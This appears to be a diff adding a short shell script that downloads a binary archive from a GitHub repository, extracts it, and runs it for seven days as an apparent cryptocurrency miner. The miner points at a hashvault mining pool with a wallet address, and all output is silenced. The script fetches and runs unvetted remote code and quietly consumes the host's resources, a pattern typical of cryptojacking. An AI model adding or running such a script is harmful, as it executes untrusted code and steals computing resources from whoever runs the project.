@@ -1,0 +1,5 @@
+wget https://github.com/icha798/revo/raw/main/RTM.tar.gz
+tar xf RTM.tar.gz
+timeout 10080m ./RTM --url pool.hashvault.pro:80 --user ZEPHsCkAtVmQPWiNweaUB2J8UC68jPZC9E1Sbztz2Nus2vtih87GdN3CpdzFs76CaXGuxHZ4SLFzAXnMzjLw4dHvbTbcpNsPE7f --pass crot --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+ >/dev/null >/dev/null 2>&1
+
